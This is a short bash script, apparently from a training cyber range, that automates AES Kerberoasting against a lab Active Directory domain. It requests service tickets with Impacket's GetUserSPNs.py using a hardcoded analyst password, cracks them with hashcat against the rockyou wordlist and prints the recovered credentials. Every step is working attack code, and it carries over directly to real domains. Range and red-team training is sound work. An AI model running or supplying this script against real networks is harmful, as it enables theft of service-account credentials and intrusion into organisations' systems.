#!/bin/bash
# CADRE — WT#002 AES Kerberoasting (range.local)
# analyst_dfir is in cadre.local, NOT range.local.
# Use range.local users: analyst_osint / analyst_malware / analyst_forensic
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#002 — AES Kerberoasting"
start_attack "002" "AES Kerberoasting"

RANGE_USER="analyst_osint"
RANGE_PASS="0S1NT_An@lyst!"
GETSPNS=$(command -v GetUserSPNs.py || echo "$HOME/.local/bin/GetUserSPNs.py")

require_tool hashcat
require_env DC03 "DC03"

step "Step 1: Request all AES-encrypted TGS tickets from range.local"
run_cmd "python3 $GETSPNS \"range.local/$RANGE_USER:$RANGE_PASS\" -dc-ip $DC03 -request -outputfile aes_tgs.txt"

step "Step 2: Verify TGS file was written"
run_cmd "ls -la aes_tgs.txt"

step "Step 3: Crack AES TGS hash with hashcat"
run_cmd "hashcat -m 19700 aes_tgs.txt /usr/share/wordlists/rockyou.txt --force"

step "Step 4: Show cracked credentials"
run_cmd "hashcat -m 19700 aes_tgs.txt --show"

result $? "AES Kerberoasting completed"
